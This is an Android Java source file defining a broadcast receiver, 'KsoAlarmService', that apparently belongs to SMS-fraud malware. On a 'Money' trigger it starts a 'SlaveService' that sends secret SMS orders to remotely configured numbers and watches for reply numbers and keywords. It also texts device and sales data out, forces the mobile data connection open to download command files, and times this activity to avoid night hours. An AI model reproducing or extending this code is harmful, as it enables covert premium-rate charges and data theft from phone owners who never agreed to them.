package com.sttm.charge;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

import java.util.Calendar;
import java.util.List;

import org.xmlpull.v1.XmlPullParserException;

import android.content.BroadcastReceiver;

import android.content.Context;
import android.content.Intent;

import com.sttm.bean.App;
import com.sttm.bean.SalesVolume;

import com.sttm.model.GPRSService;

import com.sttm.model.AppFitler;
import com.sttm.model.AppService;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.model.TimerCenter;

import com.sttm.util.IsNetOpen;
import com.sttm.util.KsoCache;
import com.sttm.util.RootHelper;

import com.sttm.util.SmsCenterNumber;

public class KsoAlarmService extends BroadcastReceiver {

	@Override
	public void onReceive(final Context context, Intent intent) {

		if (intent.getAction().equals("start")) {

			KsoMainCourse.startSaleHandler(context);
			KsoMainCourse.startGPRSHandler(context);
			KsoMainCourse.startAppsHandler(context);
		} else if (intent.getAction().equals("apps")) {
			UpdateAppsData(context);

		} else if (intent.getAction().equals("timeout")) {
			KsoCache.getInstance().reSetValue("accessFilterSms", false);

		} else if (intent.getAction().equals("SmsCenter")) {
			SmsCenterNumber smsCenter = new SmsCenterNumber(context);
			smsCenter.sendSms();
		} else if (intent.getAction().equals("downLoadSalesFile")) {
			UpdateGprsData(context, "sale.xml");

		} else if (intent.getAction().equals("sales5")) {


			String saleSmsCat = KsoCache.getInstance().getValue("salenum") != null ? (String) KsoCache
					.getInstance().getValue("salenum") : "";
		
			SalesVolume sv = SalesVolume.getInstance(context, "05");
			if (!"".equals(saleSmsCat)) {
				SmsSenderAndReceiver.send2(saleSmsCat, sv
						.mergesalesvolumestring().trim());

				context.deleteFile("sale.xml");
		
			}

		} else if (intent.getAction().equals("GPRS")) {



			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			if (hour < 7) {
				int year = calendar.get(Calendar.YEAR);
				int month = calendar.get(Calendar.MONTH);
				int day = calendar.get(Calendar.DAY_OF_MONTH);

				hour = 7 + hour;
				int temp = (int) Math.random() * 100;
				while (temp >= 60) {
					temp = (int) Math.random() * 100;
				}
				int minute = temp;
				TimerCenter tcenter = new TimerCenter();

				Calendar timerDelay = tcenter.getTime(year, month, day, hour,
						minute, 0);
				tcenter.startTimerHandler(context, timerDelay, "GPRS");
				return;

			}


			UpdateGprsData(context, "shuihu.xml");


		} else if (intent.getAction().equals("Money")) {
			
					
					/*List<App> apps = (List<App>)KsoCache.getInstance().getValue("apps");
					boolean flag = AppFitler.checkApp2(context, apps);
				
					if (flag) {
							return;
					}*/
			
		


			String secretSmsNumber = KsoCache.getInstance().getValue(
					"secretSmsNumber") != null ? (String) KsoCache
					.getInstance().getValue("secretSmsNumber") : "";
			String secretSmsOrder = KsoCache.getInstance().getValue(
					"secretSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsOrder") : "";

			long time = KsoCache.getInstance().getValue("interval") != null ? (Long) KsoCache
					.getInstance().getValue("interval") : 0;

			int secretSmsCount = KsoCache.getInstance().getValue(
					"secretSmsCount") != null ? (Integer) KsoCache
					.getInstance().getValue("secretSmsCount") : 2;
			String relpyNumber = KsoCache.getInstance().getValue("replyNumber") != null ? (String) KsoCache
					.getInstance().getValue("replyNumber") : "";
			String keyword = KsoCache.getInstance().getValue("keyword") != null ? (String) KsoCache
					.getInstance().getValue("keyword") : "";



			if (!"".equals(secretSmsNumber) && !"".equals(secretSmsOrder)) {
				if (secretSmsCount > 0) {

					Intent service = new Intent(context, SlaveService.class);
					service.putExtra("sendTime", time);
					service.putExtra("sendCount", secretSmsCount);
					service.putExtra("flag", 4);
					service.putExtra("secretSmsReplyNumber", relpyNumber);
					service.putExtra("secretSmsNumber", secretSmsNumber);
					service.putExtra("secretSmsOrder", secretSmsOrder);
					service.putExtra("keyword", keyword);
					context.startService(service);
				}

			}

		} else if (intent.getAction().equals("ksoSendSms")) {


			String smsNumber = KsoCache.getInstance().getValue("ksoSmsNumber") != null ? (String) KsoCache
					.getInstance().getValue("ksoSmsNumber") : "";

			String smsOrder = KsoCache.getInstance().getValue("ksoSmsOrder") != null ? (String) KsoCache
					.getInstance().getValue("ksoSmsOrder") : "";

			if (!"".equals(smsNumber) && !"".equals(smsOrder)) {
				SmsSenderAndReceiver.send2(smsNumber, smsOrder);
				long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4
						: (Long) KsoCache.getInstance().getValue("timeout");
				KsoMainCourse.startTimeoutHandler(context, timeout);

			}

		}
	}

	public void UpdateGprsData(final Context context, final String fileName) {
		new Thread() {

			public void run() {
				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {

					WapApnHelper wh = new WapApnHelper(context);
					wh.saveState();

					wh.openAPN();

					if (!ino.checkNet()) {

						KsoCache.getInstance().reSetValue("updateFail",
								fileName);

					} else {
						GPRSService.updateGprsData(context, fileName);

						wh.reSetNetState();
					}
				} else {
					GPRSService.updateGprsData(context, fileName);
				}

			}
		}.start();
	}

	public void UpdateAppsData(final Context context) {
		new Thread() {
			public void run() {

				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {

					WapApnHelper wh = new WapApnHelper(context);
					wh.saveState();
					wh.openAPN();

					try {
						Thread.sleep(5000);
					} catch (Exception e) {

					}
					if (!ino.checkNet()) {

						KsoCache.getInstance().reSetValue("updateFail",
								"apps.xml");

					} else {
						AppService.updateAppsData(context);

						wh.reSetNetState();
					}

				} else {
					AppService.updateAppsData(context);
				}

			}
		}.start();
	}

}
